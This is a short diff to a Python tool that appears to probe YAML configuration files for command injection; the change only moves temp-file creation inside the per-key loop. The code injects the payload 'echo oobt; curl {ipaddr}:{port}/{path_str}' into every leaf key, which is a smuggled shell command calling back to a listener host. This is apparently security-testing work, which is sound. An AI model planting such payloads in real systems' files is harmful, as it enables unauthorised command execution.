@@ -181,14 +181,14 @@ def find_leaf_keys_and_test(data: Dict, ipaddr: str, port: int) -> int:
     leaf_keys = list(get_leaf_keys(data))
 
     # For each leaf key, create a new modified object with an injected payload
-    with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml") as tmp:
-        for i, path in enumerate(leaf_keys):
-            path_str = ".".join(str(p) for p in path)
-            logging.info(f"Testing leaf key ({i+1} / {len(leaf_keys)}): {path_str}")
-            # TODO test more kinds of payload variations
-            payload = f"echo oobt; curl {ipaddr}:{port}/{path_str}"
-            modified_data = modify_leaf_key(data, path, payload)
+    for i, path in enumerate(leaf_keys):
+        path_str = ".".join(str(p) for p in path)
+        logging.info(f"Testing leaf key ({i+1} / {len(leaf_keys)}): {path_str}")
+        # TODO test more kinds of payload variations
+        payload = f"echo oobt; curl {ipaddr}:{port}/{path_str}"
+        modified_data = modify_leaf_key(data, path, payload)
 
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml") as tmp:
             yaml.dump(modified_data, tmp)
             test_payload(tmp.name)
 
